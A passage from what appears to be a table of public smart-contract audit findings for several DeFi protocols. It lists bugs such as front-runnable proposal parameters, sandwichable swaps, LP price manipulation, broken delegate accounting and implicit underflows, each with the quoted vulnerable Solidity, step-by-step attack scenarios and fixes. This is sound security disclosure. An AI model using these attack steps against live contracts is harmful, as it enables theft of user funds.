Then, on the second call, to actually change the vote, `fate * currentFate == 0` because `currentFate` is 0.

#### Recommended Mitigation Steps

Make sure that going to 0 is equivalent to a flip, but going away from 0 isn't a flip.





***"
78.md,Lack of access control in the `parameterize` function of proposal contracts,medium,"Most of the proposal contracts have a `parameterize` function for setting the proposal parameters, and these functions are protected only by the `notCurrent` modifier. When the proposal is proposed through a `lodgeProposal` transaction, an attacker can front-run it, modify the proposal parameters, and let the community vote it down. As a result, the person proposing loses his `fate` deposit.

#### Proof of Concept

1.  A benign user Alice wants to make a proposal, so she deploys one of the proposal contracts and sets the intended parameters. Her proposal is approved by the `ProposalFactory` and is ready to be proposed.
2.  Alice calls the `lodgeProposal` function of `ProposalFactory` to propose her proposal.
3.  An attacker Bob, who listens to the mempool, notices Alice's transaction and front-runs it. He calls the `parameterize` function to change the parameters to undesirable ones.
4.  Alice's proposal becomes the current proposal. However, the community rejects the proposal because of the changed parameters, causing Alice to lose her deposit.

Referenced code:
[DAO/Proposals/BurnFlashStakeDeposit.sol#L25-L37](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/BurnFlashStakeDeposit.sol#L25-L37)
[DAO/Proposals/SetAssetApprovalProposal.sol#L21-L24](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/SetAssetApprovalProposal.sol#L21-L24)
[DAO/Proposals/ToggleWhitelistProposalProposal.sol#L22-L28](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/ToggleWhitelistProposalProposal.sol#L22-L28)
[DAO/Proposals/UpdateMultipleSoulConfigProposal.sol#L40-L61](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/UpdateMultipleSoulConfigProposal.sol#L40-L61)
[DAO/Proposals/WithdrawERC20Proposal.sol#L26-L32](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/Proposals/WithdrawERC20Proposal.sol#L26-L32)
[DAO/ProposalFactory.sol#L74-L78](https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/DAO/ProposalFactory.sol#L74-L78)

#### Recommended Mitigation Steps

Only allow the creator of the proposal to modify the parameters.





***"
78.md,UniswapHelper.buyFlanAndBurn is a subject to sandwich attacks,medium,"Trades can happen at a manipulated price and end up receiving fewer Flan to be bought than current market price dictates.

For example, at the time a user decides to call `buyFlanAndBurn` Flan trades at 0.8 in the input token terms at the corresponding DEX pool. If the input token holdings are big enough to compensate for pool manipulation costs, the following can happen: Flan buy order will be seen by a malicious bot, that buys Flan, pushing it to 0.9 before UniswapHelper's order comes through, and selling it back right afterwards. This way, given a cumulative impact of the trades on Flan's market price, the input token will be overspent.

This yields direct loss for the system as input token market operations have lesser effect than expected at the expense of contract holdings.

#### Proof of Concept

`buyFlanAndBurn` doesn't control for swap results, executing swaps with exchange pool provided amounts, which can be manipulated:

<https://github.com/code-423n4/2022-01-behodler/blob/main/contracts/UniswapHelper.sol#L231>

#### Recommended Mitigation Steps

Consider adding the minimum accepted price as a function argument so a user can limit the effective slippage, and check that actually received amount is above this accepted minimum.

Also, in the future it will prudent to add a relative version of the parameter to control percentage based slippage with TWAP Oracle price as a benchmark.




***"
66.md,receiveCollateral() can be called by anyone,high,"#### Impact

In StabilityPool.sol, the receiveCollateral() function should be called by ActivePool per comments,  but anyone can call it passing in \_tokens and \_amounts args to update stability pool balances.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/StabilityPool.sol#L1143>

#### Recommended Mitigation Steps

Allow only the ActivePool to call the receiveCollateral() function:
require(msg.sender = address(active pool address), ""Can only be called by ActivePool"")"
66.md,Yeti token rebase checks the additional token amount incorrectly,high,"#### Impact

The condition isn't checked now as the whole balance is used instead of the Yeti tokens bought back from the market.
As it's not checked, the amount added to `effectiveYetiTokenBalance` during rebase can exceed the actual amount of the Yeti tokens owned by the contract.
As the before check amount is calculated as the contract net worth, it can be fixed by immediate buy back, but it will not be the case.

The deficit of Yeti tokens can materialize in net worth terms as well if Yeti tokens price will raise compared to the last used one.
In this case users will be cumulatively accounted with the amount of tokens that cannot be actually withdrawn from the contract, as its net holdings will be less then total users’ claims.
In other words, the contract will be in default if enough users claim after that.

#### Proof of Concept

Now the whole balance amount is used instead of the amount bought back from market.

Rebasing amount is added to `effectiveYetiTokenBalance`, so it should be limited by extra Yeti tokens, not the whole balance:
<https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/YETI/sYETIToken.sol#L247>

#### Recommended Mitigation Steps

It looks like only extra tokens should be used for the check, i.e. `yetiToken.balance - effectiveYetiTokenBalance`.

Now:
```solidity
function rebase() external {
        ...
    uint256 yetiTokenBalance = yetiToken.balanceOf(address(this));
    uint256 valueOfContract = _getValueOfContract(yetiTokenBalance);
    uint256 additionalYetiTokenBalance = ...
    if (yetiTokenBalance < additionalYetiTokenBalance) {
            additionalYetiTokenBalance = yetiTokenBalance;
    }
    effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance);
...
function _getValueOfContract(uint _yetiTokenBalance) internal view returns (uint256) {
    uint256 adjustedYetiTokenBalance = _yetiTokenBalance.sub(effectiveYetiTokenBalance);
    uint256 yusdTokenBalance = yusdToken.balanceOf(address(this));
    return div(lastBuybackPrice.mul(adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance);
}
```
As the `_getValueOfContract` function isn't used elsewhere, the logic can be simplified.
To be:
```solidity
function rebase() external {
    ...
    uint256 adjustedYetiTokenBalance = (yetiToken.balanceOf(address(this))).sub(effectiveYetiTokenBalance);
    uint256 valueOfContract = _getValueOfContract(adjustedYetiTokenBalance);
    uint256 additionalYetiTokenBalance = ...
    if (additionalYetiTokenBalance > adjustedYetiTokenBalance) {
            additionalYetiTokenBalance = adjustedYetiTokenBalance;
    }
    effectiveYetiTokenBalance = effectiveYetiTokenBalance.add(additionalYetiTokenBalance);
...
function _getValueOfContract(uint _adjustedYetiTokenBalance) internal view returns (uint256) {
    uint256 yusdTokenBalance = yusdToken.balanceOf(address(this));
    return div(lastBuybackPrice.mul(_adjustedYetiTokenBalance), (1e18)).add(yusdTokenBalance);
}
```"
66.md,Wrong `lastBuyBackPrice`,medium,"The `sYETIToken.lastBuyBackPrice` is set in `buyBack` and hardcoded as:

```solidity
function buyBack(address routerAddress, uint256 YUSDToSell, uint256 YETIOutMin, address[] memory path) external onlyOwner {
    require(YUSDToSell > 0, ""Zero amount"");
    require(lastBuybackTime + 69 hours < block.timestamp, ""Must have 69 hours pass before another buyBack"");
    yusdToken.approve(routerAddress, YUSDToSell);
    uint256[] memory amounts = IRouter(routerAddress).swapExactTokensForTokens(YUSDToSell, YETIOutMin, path, address(this), block.timestamp + 5 minutes);
    lastBuybackTime = block.timestamp;
    // amounts[0] is the amount of YUSD that was sold, and amounts[1] is the amount of YETI that was gained in return. So the price is amounts[0] / amounts[1]
    // @audit this hardcoded lastBuybackPrice is wrong when using a different path (think path length 3)
    lastBuybackPrice = div(amounts[0].mul(1e18), amounts[1]);
    emit BuyBackExecuted(YUSDToSell, amounts[0], amounts[1]);
}
```

It divides the first and second return `amounts` of the swap, however, these amounts depend on the swap `path` parameter that is used by the caller.
If a swap path of length 3 is used, then this is obviously wrong.
It also assumes that each router sorts the pairs the same way (which is true for Uniswap/Sushiswap).

#### Impact

The `lastBuyBackPrice` will be wrong when using a different path.
This will lead `rebase`s using a different yeti amount and the `effectiveYetiTokenBalance` being updated wrong.

#### Recommended Mitigation Steps

Verify the first and last element of the path are YETI/YUSD and use the first and last amount parameter.


 > @LilYeti: The idea was that on launch we will likely use a curve pool to route through so this contract would change slightly. However it is valid and some more checks would be good to add. Moving to level 1 issue."
66.md,Should check return data from Chainlink aggregators,medium,"#### Impact

The latestRoundData function in the contract PriceFeed.sol fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, there are no checks on roundID.

Stale prices could put funds at risk. According to Chainlink's documentation, This function does not error if no answer has been reached but returns 0, causing an incorrect price fed to the PriceOracle. The external Chainlink oracle, which provides index price information to the system, introduces risk inherent to any dependency on third-party data sources. For example, the oracle could fall behind or otherwise fail to be maintained, resulting in outdated data being fed to the index price calculations of the liquidity.

Example Medium Issue : <https://github.com/code-423n4/2021-08-notional-findings/issues/18>

#### Proof of Concept

1.  Navigate to the following contract.

<https://github.com/code-423n4/2021-12-yetifinance/blob/1da782328ce4067f9654c3594a34014b0329130a/packages/contracts/contracts/PriceFeed.sol#L578>

2.  Only the following checks are implemented.

```js
    if (!_response.success) {return true;}
    // Check for an invalid roundId that is 0
    if (_response.roundId == 0) {return true;}
    // Check for an invalid timeStamp that is 0, or in the future
    if (_response.timestamp == 0 || _response.timestamp > block.timestamp) {return true;}
    // Check for non-positive price
    if (_response.answer <= 0) {return true;}
```

#### Recommended Mitigation Steps

Consider to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:
```solidity
(uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData();
require(price > 0, ""Chainlink price <= 0""); 
require(answeredInRound >= roundID, ""..."");
require(timeStamp != 0, ""..."");
```"
66.md,Unwhitelisted token can cause disaster,medium,"#### Impact

Contract instability and financial loss. This will happen if one of the allowed contract calls sendCollaterals with non whitelisted token (may happen with user input on allowed contract)

#### Proof of Concept

1.  Navigate to contract at <https://github.com/code-423n4/2021-12-yetifinance/blob/main/packages/contracts/contracts/ActivePool.sol>

2.  Assume sendCollaterals function is called by one of allowed contract with a non whitelisted token and amount as 1

```solidity
function sendCollaterals(address _to, address[] memory _tokens, uint[] memory _amounts) external override returns (bool) {
    _requireCallerIsBOorTroveMorTMLorSP();
    require(_tokens.length == _amounts.length);
    for (uint i = 0; i < _tokens.length; i++) {
        _sendCollateral(_to, _tokens[i], _amounts[i]); // reverts if send fails
    }

    if (_needsUpdateCollateral(_to)) {
        ICollateralReceiver(_to).receiveCollateral(_tokens, _amounts);
    }
    
    return true;
}
```

3.  This calls \_sendCollateral with our non whitelisted token and amount as 1

```solidity
function _sendCollateral(address _to, address _collateral, uint _amount) internal returns (bool) {
    uint index = whitelist.getIndex(_collateral);
    poolColl.amounts[index] = poolColl.amounts[index].sub(_amount);
    bool sent = IERC20(_collateral).transfer(_to, _amount);
    require(sent);

    emit ActivePoolBalanceUpdated(_collateral, _amount);
    emit CollateralSent(_collateral, _to, _amount);
}
```
4.  whitelist.getIndex(\_collateral); will return 0 as our collateral is not whitelisted and will not be present in whitelist.getIndex(\_collateral);. This means index will point to whitelisted collateral at index 0

5.  poolColl.amounts\[index] will get updated for whitelisted collateral at index 0 even though this collateral was never meant to be updated

```solidity
poolColl.amounts[index] = poolColl.amounts[index].sub(_amount);
```

6.  Finally our non supported token gets transferred to recipient and since \_needsUpdateCollateral is true so recipient poolColl.amounts gets increased even though recipient never received the whitelisted collateral

7.  Finally sender pool amount will be reduced even though it has the whitelisted collateral and recipient pool amount will be increased even though it does not have whitelisted collateral

#### Recommended Mitigation Steps

Add a check to see if collateral to be transferred is whitelisted"
66.md,Out of gas.,medium,"There is no upper limit on `poolColl.tokens[]`, it increments each time  when a new collateral is added. Eventually, as the count of collateral increases, gas cost of smart contract calls will raise  and that there is no implemented function to reduce the array size.

#### Impact

For every call  `getVC()` function which computed  contain the VC value of a given collateralAddress is listed in `poolColl.tokens[]` array, the gas consumption can be more expensive each time that a new collateral address is appended to the  array, until reaching an ""Out of Gas"" error or a ""Block Gas Limit"" in the worst scenario.

#### Proof of Concept

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/ActivePool.sol#L268>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/DefaultPool.sol#L184>

#### Tools Used

Remix

#### Recommended Mitigation Steps

Array's length should be checked.

 > We would actually recommend it be a severity level 2, but it does have high potential risk."
66.md,Reentrancy in contracts/BorrowerOperations.sol,medium,"#### Impact

There are several potential re-entrant functions in contracts/BorrowerOperations.sol:

\=> Function addColl() on line 346 is potentially re-entrant as it is external but has no re-entrancy guard declared.   This
function invokes \_adjustTrove() which potentially impacts user debt, collateral top-ups or withdrawals.

*   Same applies to

\-- withdrawColl() on line 373
\-- withdrawYUSD() on line 389
\-- repayYUSD() on line 406
\-- adjustTrove() on line 420

\=> Function openTrove() on line 207 is potentially re-entrant as it is external but has no re-entrancy guard declared.   This
function invokes \_openTroveInternal() which potentially impacts trove creation, YUSD withdrawals and YUSD gas compensation.

\=> Function closeTrove() on line 628 is potentially re-entrant as it is external but has no re-entrancy guard declared.   This function invokes troveManagerCached.removeStake(msg.sender) and troveManagerCached.closeTrove(msg.sender) impacting outcomes like debt, rewards and trove ownership.

#### Proof of Concept

<https://solidity-by-example.org/hacks/re-entrancy/>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L346>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L373>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L389>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L420>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L207>

<https://github.com/code-423n4/2021-12-yetifinance/blob/5f5bf61209b722ba568623d8446111b1ea5cb61c/packages/contracts/contracts/BorrowerOperations.sol#L628>

#### Tools Used

Slither

#### Recommended Mitigation Steps

Potential solution is a re-entrancy guard similar to <https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard>"
66.md,Collateral parameters can be overwritten,medium,"It's possible to repeatedly add the first collateral token in `validCollateral` through the `Whitelist.addCollateral` function.
The `validCollateral[0] != _collateral` check will return false and skip further checks.

#### POC

Owner calls `addCollateral(collateral=validCollateral[0])`:

```solidity
function addCollateral(
    address _collateral,
    uint256 _minRatio,
    address _oracle,
    uint256 _decimals,
    address _priceCurve, 
    bool _isWrapped
) external onlyOwner {
    checkContract(_collateral);
    checkContract(_oracle);
    checkContract(_priceCurve);
    // If collateral list is not 0, and if the 0th index is not equal to this collateral,
    // then if index is 0 that means it is not set yet.
    // @audit evaluates validCollateral[0] != validCollateral[0] which is obv. false => skips require check
    if (validCollateral.length != 0 && validCollateral[0] != _collateral) {
        require(collateralParams[_collateral].index == 0, ""collateral already exists"");
    }

    validCollateral.push(_collateral);
    // overwrites parameters
    collateralParams[_collateral] = CollateralParams(
        _minRatio,
        _oracle,
        _decimals,
        true,
        _priceCurve,
        validCollateral.length - 1, 
        _isWrapped
    );
}
```

#### Impact

The collateral parameters `collateralParams` are re-initialized which can break the existing accounting.
The collateral token also exists multiple times in `validCollateral`.

#### Recommended Mitigation Steps

Fix the check. It should be something like:

```solidity
if (validCollateral.length > 0) {
    require(collateralParams[_collateral].index == 0 && validCollateral[0] != _collateral, ""collateral already exists"");
}
```"
66.md,Cannot use most piecewise linear functions with current implementation,medium,"The `ThreePieceWiseLinearPriceCurve.adjustParams` function uses three functions `f1, f2, f3` where `y_i = f_i(x_i)`.
It computes the y-axis intersect (`b2 = f_2(0), b3 = f_3(0)`) for each of these but uses **unsigned integers** for this, which means these values cannot become negative.
This rules out a whole class of functions, usually the ones that are desirable.

#### Example:

Check out this two-piece linear interest curve of Aave:

![Aave](https://docs.aave.com/\~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-M51Fy3ipxJS-0euJX3h-2670852272%2Fuploads%2Fycd9OMRnInNeetUa7Lj1%2FScreenshot%202021-11-23%20at%2018.52.26.png?alt=media\&token=7a25b900-7023-4ee5-b582-367d56d31894)
The intersection of the second steep straight line with the y-axis `b_2 = f_2(0)` would be negative.

Example:
Imagine a curve that is flat at `10%` on the first 50% utilization but shoots up to `110%` at 100% utilization.

*   `m1 = 0, b1 = 10%, cutoff1 = 50%`
*   `m2 = 200%` => `b2 = m1 * cutoff1 + b1 - m2 * cutoff1 = f1(cutoff1) - m2 * cutoff1 = 10% - 200% * 50% = 10% - 100% = -90%`. (`f2(100%) = 200% * 100% - 90% = 110%` ✅)

This function would revert in the `b2` computation as it underflows due to being a negative value.

#### Impact

Most curves that are actually desired for a lending platform (becoming steeper at higher utilization) cannot be used.

#### Recommended Mitigation Steps

Evaluate the piecewise linear function in a different way that does not require computing the y-axis intersection value.
For example, for `cutoff2 >= x > cutoff1`, use `f(x) = f_1(cutoff) + f_2(x - cutoff)`.
See [Compound](https://github.com/compound-finance/compound-protocol/blob/master/contracts/JumpRateModel.sol#L85)."
66.md,Wrong comment in `getFee`,medium,"The `ThreePieceWiseLinearPriceCurve.getFee` comment states that the total + the input must be less than the cap:

> If dollarCap == 0, then it is not capped. Otherwise, **then the total + the total input** must be less than the cap.

The code only checks if the input is less than the cap:

```solidity
// @param _collateralVCInput is how much collateral is being input by the user into the system
if (dollarCap != 0) {
    require(_collateralVCInput <= dollarCap, ""Collateral input exceeds cap"");
}
```

#### Recommended Mitigation Steps

Clarify the desired behavior and reconcile the code with the comments."
66.md,Fee not decayed if past `decayTime`,medium,"The `ThreePieceWiseLinearPriceCurve.calculateDecayedFee` function is supposed to decay the `lastFeePercent` over time.
This is correctly done in the `decay > 0 && decay < decayTime` case, but for the `decay > decayTime` case it does not decay at all but should set it to 0 instead..

```solidity
if (decay > 0 && decay < decayTime) {
    // @audit if decay is close to decayTime, this fee will be zero. but below it'll be 1. the more time passes, the higher the decay. but then decay > decayTime should return 0.
    fee = lastFeePercent.sub(lastFeePercent.mul(decay).div(decayTime));
} else {
    fee = lastFeePercent;
}
```

#### Recommended Mitigation Steps

It seems wrong to handle the `decay == 0` case (decay happened in same block) the same way as the `decay >= decayTime` case (decay happened long time ago) as is done in the `else` branch.
I believe it should be like this instead:

```solidity
// decay == 0 case should be full lastFeePercent
if(decay < decayTime) {
    fee = lastFeePercent.sub(lastFeePercent.mul(decay).div(decayTime));
} else {
    // reset to zero if decay >= decayTime
    fee = 0;
}
```"
28.md,`PostAuctionLauncher.sol#finalize()` Adding liquidity to an existing pool may allows the attacker to steal most of the tokens,high,"`PostAuctionLauncher.finalize()` can be called by anyone, and it sends tokens directly to the pair pool to mint liquidity, even when the pair pool exists.

An attacker may control the LP price by creating the pool and then call `finalize()` to mint LP token with unfair price (pay huge amounts of tokens and get few amounts of LP token), and then remove the initial liquidity they acquired when creating the pool and take out huge amounts of tokens.

<https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/Liquidity/PostAuctionLauncher.sol#L257>

```solidity
/**
 * @notice Finalizes Token sale and launches LP.
 * @return liquidity Number of LPs.
 */
function finalize() external nonReentrant returns (uint256 liquidity) {
    // GP: Can we remove admin, let anyone can finalise and launch?
    // require(hasAdminRole(msg.sender) || hasOperatorRole(msg.sender), ""PostAuction: Sender must be operator"");
    require(marketConnected(), ""PostAuction: Auction must have this launcher address set as the destination wallet"");
    require(!launcherInfo.launched);

    if (!market.finalized()) {
        market.finalize();
    }
    require(market.finalized());

    launcherInfo.launched = true;
    if (!market.auctionSuccessful() ) {
        return 0;
    }

    /// @dev if the auction is settled in weth, wrap any contract balance 
    uint256 launcherBalance = address(this).balance;
    if (launcherBalance > 0 ) {
        IWETH(weth).deposit{value : launcherBalance}();
    }
    
    (uint256 token1Amount, uint256 token2Amount) =  getTokenAmounts();

    /// @dev cannot start a liquidity pool with no tokens on either side
    if (token1Amount == 0 || token2Amount == 0 ) {
        return 0;
    }

    address pair = factory.getPair(address(token1), address(token2));
    if(pair == address(0)) {
        createPool();
    }

    /// @dev add liquidity to pool via the pair directly
    _safeTransfer(address(token1), tokenPair, token1Amount);
    _safeTransfer(address(token2), tokenPair, token2Amount);
    liquidity = IUniswapV2Pair(tokenPair).mint(address(this));
    launcherInfo.liquidityAdded = BoringMath.to128(uint256(launcherInfo.liquidityAdded).add(liquidity));

    /// @dev if unlock time not yet set, add it.
    if (launcherInfo.unlock == 0 ) {
        launcherInfo.unlock = BoringMath.to64(block.timestamp + uint256(launcherInfo.locktime));
    }
    emit LiquidityAdded(liquidity);
}
```

In line 257, `PostAuctionLauncher` will mint LP with `token1Amount` and `token2Amount`. The amounts (`token1Amount` and `token2Amount`) are computed according to the auction result, without considering the current price (reserves) of the existing `tokenPair`.

See [PostAuctionLauncher.getTokenAmounts()](https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/Liquidity/PostAuctionLauncher.sol#L268)

`PostAuctionLauncher` will receive an unfairly low amount of lp token because the amounts sent to `tokenPair` didn't match the current price of the pair.

See [UniswapV2Pair.mint(...)](https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/UniswapV2/UniswapV2Pair.sol#L135)

```solidity
liquidity = MathUniswap.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
```

#### Impact

Lose a majority share of the tokens.

#### Proof of Concept

1.  The attacker creates LP with 0.0000001 token1 and 1000 token2, receives 0.01 LP token;
2.  Call `PostAuctionLauncher.finalize()`. PostAuctionLauncher will mint liquidity with 2000 token1 and 1000 token2 for example, receives only  0.01 LP token;
3.  The attacker removes all his LP, receives 1000 token1 (most of which come from `PostAuctionLauncher`).

#### Recommended Mitigation Steps

To only support tokenPair created by `PostAuctionLauncher` or check for the token price before mint liquidity."
28.md,SushiToken transfers are broken due to wrong delegates accounting on transfers,high,".

When minting / transferring / burning tokens, the `SushiToken._beforeTokenTransfer` function is called and supposed to correctly shift the voting power due to the increase/decrease in tokens for the `from` and `to` accounts.
However, it does not correctly do that, it tries to shift the votes from the `from` account, instead of the **`_delegates[from]`** account.
This can lead to transfers reverting.

#### Proof Of Concept

Imagine the following transactions on the `SushiToken` contract.
We'll illustrate the corresponding `_moveDelegates` calls and written checkpoints for each.

*   `mint(A, 1000) = transfer(0, A, 1000)` => ` _moveDelegates(0, delegates[A]=0)  ` => no checkpoints are written to anyone because delegatees are still zero
*   A delegates to A' => `_moveDelegates(0, A')` => `writeCheckpoint(A', 1000)`
*   B delegates to B' => no checkpoints are written as B has a zero balance
*   `transfer(A, B, 1000)` => `_moveDelegates(A, delegates[B] = B')` => underflows when subtracting `amount=1000` from A's non-existent checkpoint (defaults to 0 votes)

It should subtract from A's delegatee `A'`'s checkpoint instead.

#### Impact

Users that delegated votes will be unable to transfer any of their tokens.

#### Recommended Mitigation Steps

In `SushiToken._beforeTokenTransfer`, change the `_moveDelegates` call to be from `_delegates[from]` instead:

```solidity
function _beforeTokenTransfer(address from, address to, uint256 amount) internal override { 
    _moveDelegates(_delegates[from], _delegates[to], amount);
    super._beforeTokenTransfer(from, to, amount);
}
```

This is also how the [original code from Compound](https://github.com/compound-finance/compound-protocol/blob/master/contracts/Governance/Comp.sol#L241) does it."
28.md,"Last person to withdraw his tokens might not be able to do this, in Crowdsale (edge case)",high,".

#### Impact

Suppose a Crowdsale is successful and enough commitments are made before the `marketInfo.endTime`.
Suppose marketStatus.commitmentsTotal  == marketInfo.totalTokens -1      // note this is an edge case, but can be constructed by an attacker
Then the function `auctionEnded()` returns true
Assume `auctionSuccessful()` is also true (might depend on the config of `marketPrice.goal` and `marketInfo.totalTokens`)
Then an admin can call `finalize()` to finalize the Crowdsale.
The function finalize distributes the funds and the unsold tokens and sets `status.finalized = true` so that finalized cannot be called again.
Now we have ""marketInfo.totalTokens -1"" tokens left in the contract

However `commitEth()` or `commitTokens()` can still be called (they give no error message that the auction has ended)
Then functions call `calculateCommitment`, which luckily prevent from buying too much, however 1 token can still be bought
These functions also call `\_addCommitment()`, which only checks for `marketInfo.endTime`, which hasn't passed yet.

Now an extra token is sold and the contract has 1 token short. So the last person to withdraw his tokens cannot withdraw them (because you cannot specify how much you want to withdraw)

Also the revenues for the last token cannot be retrieved as `finalize()` cannot be called again.

#### Proof of Concept

<https://github.com/sushiswap/miso/blob/master/contracts/Auctions/Crowdsale.sol#L374>

```js
 function finalize() public nonReentrant {
        require(hasAdminRole(msg.sender) || wallet == msg.sender || hasSmartContractRole(msg.sender) || finalizeTimeExpired(),""Crowdsale: sender must be an admin""); // can be called by admin
        MarketStatus storage status = marketStatus;
        require(!status.finalized, ""Crowdsale: already finalized"");
        MarketInfo storage info = marketInfo;
        require(auctionEnded(), ""Crowdsale: Has not finished yet"");    // is true if enough sold, even if this is before marketInfo.endTime

        if (auctionSuccessful()) {          
            /// @dev Transfer contributed tokens to wallet.
            /// @dev Transfer unsold tokens to wallet.
        } else {
            /// @dev Return auction tokens back to wallet.
        }
        status.finalized = true;

function auctionEnded() public view returns (bool) {
        return block.timestamp > uint256(marketInfo.endTime) || 
        _getTokenAmount(uint256(marketStatus.commitmentsTotal) + 1) >= uint256(marketInfo.totalTokens); // is true if enough sold, even if this is before marketInfo.endTime
    }

function auctionSuccessful() public view returns (bool) {
        return uint256(marketStatus.commitmentsTotal) >= uint256(marketPrice.goal);
}

function commitEth(address payable _beneficiary, bool readAndAgreedToMarketParticipationAgreement ) public payable nonReentrant  {
       ...
        uint256 ethToTransfer = calculateCommitment(msg.value);
       ...
       _addCommitment(_beneficiary, ethToTransfer);
   
 function calculateCommitment(uint256 _commitment) public view returns (uint256 committed) { // this prevents buying too much
        uint256 tokens = _getTokenAmount(_commitment);
        uint256 tokensCommited =_getTokenAmount(uint256(marketStatus.commitmentsTotal));
        if ( tokensCommited.add(tokens) > uint256(marketInfo.totalTokens)) {
            return _getTokenPrice(uint256(marketInfo.totalTokens).sub(tokensCommited));
        }
        return _commitment;
    }

function _addCommitment(address _addr, uint256 _commitment) internal {
        require(block.timestamp >= uint256(marketInfo.startTime) && block.timestamp <= uint256(marketInfo.endTime), ""Crowdsale: outside auction hours""); // doesn't check auctionEnded() nor status.finalized
        ...
        uint256 newCommitment = commitments[_addr].add(_commitment);
        ...
        commitments[_addr] = newCommitment;

function withdrawTokens(address payable beneficiary) public   nonReentrant  {    
        if (auctionSuccessful()) {
            ...
            uint256 tokensToClaim = tokensClaimable(beneficiary);
            ...
            claimed[beneficiary] = claimed[beneficiary].add(tokensToClaim);
            _safeTokenPayment(auctionToken, beneficiary, tokensToClaim);    // will fail is last token is missing
        } else {



## Tools Used

## Recommended Mitigation Steps
In the function _addCommitment, add a check on auctionEnded() or status.finalized
```"
28.md,use of transfer() instead of call()  to send eth,medium,".

#### Impact

Use of `transfer()` might render ETH impossible to withdraw because after istanbul hardfork, there is an increase in the gas cost of the SLOAD operation and therefore breaks some existing smart contracts.Those contracts will break because their fallback functions used to consume less than 2300 gas, and they’ll now consume more, since 2300 the amount of gas a contract’s fallback function receives if it’s called via Solidity’s `transfer()` or `send()` methods.
Any smart contract that uses `transfer()` or `send()` is taking a hard dependency on gas costs by forwarding a fixed amount of gas: 2300.

- <https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/>

- <https://blog.openzeppelin.com/opyn-gamma-protocol-audit/>

#### Proof of Concept

- <https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/MISOTokenFactory.sol#L242>

- <https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/MISOMarket.sol#L256>

- <https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/MISOLauncher.sol#L251>

- <https://github.com/sushiswap/miso/blob/2cdb1486a55ded55c81898b7be8811cb68cfda9e/contracts/MISOFarmFactory.sol#L244>

#### Tools Used

manual review

#### Recommended Mitigation Steps

use `call()` to send eth"
17.md,implicit underflows,high,"There are a few underflows that are converted via a typecast afterwards to the expected value. If solidity 0.8.x would be used, then the code would revert.
* `int256(a-b)` where a and b are uint: For example, if `a=1` and `b=2`, then the intermediate result would be `uint(-1) == 2**256-1`
* `int256(-x)` where x is a uint. For example, if `x=1`, then the intermediate result would be `uint(-1) == 2**256-1`

It's better not to have underflows by using the appropriate typecasts. This is especially relevant when moving to solidity 0.8.x.

From `Exposure.sol` [L178](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/insurance/Exposure.sol#L178):
```solidity
function sortVaultsByDelta(..)
..
    for (uint256 i = 0; i < N_COINS; i++) {
        // Get difference between vault current assets and vault target
        int256 delta = int256(unifiedAssets[i] - unifiedTotalAssets.mul(targetPercents[i]).div(PERCENTAGE_DECIMAL_FACTOR)); // underflow in intermediate result
```

From `PnL.sol` [L112](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pnl/PnL.sol#L112):
```solidity
 function decreaseGTokenLastAmount(bool pwrd, uint256 dollarAmount, uint256 bonus)...
..
 emit LogNewGtokenChange(pwrd, int256(-dollarAmount)); // underflow in intermediate result
```

From `Buoy3Pool.sol` [L87](https://github.com/code-423n4/2021-06-gro/blob/main/contracts/pools/oracle/Buoy3Pool.sol#L87):
```solidity
function safetyCheck() external view override returns (bool) {
    ...
        _ratio = abs(int256(_ratio - lastRatio[i])); // underflow in intermediate result
```

Recommend replacing `int256(a-b)` with `int256(a)-int256(b)`, and replacing `int256(-x)` with `-int256(x)`"
17.md,`Buoy3Pool.safetyCheck` is not precise and has some assumptions,high,"The `safetyCheck` function has several issues that impact how precise the checks are:

1. Only checks if the `a/b` and `a/c` ratios are within `BASIS_POINTS`.
By transitivity, `b/c` is only within `2 * BASIS_POINTS` if `a/b` and `a/c` are in range.
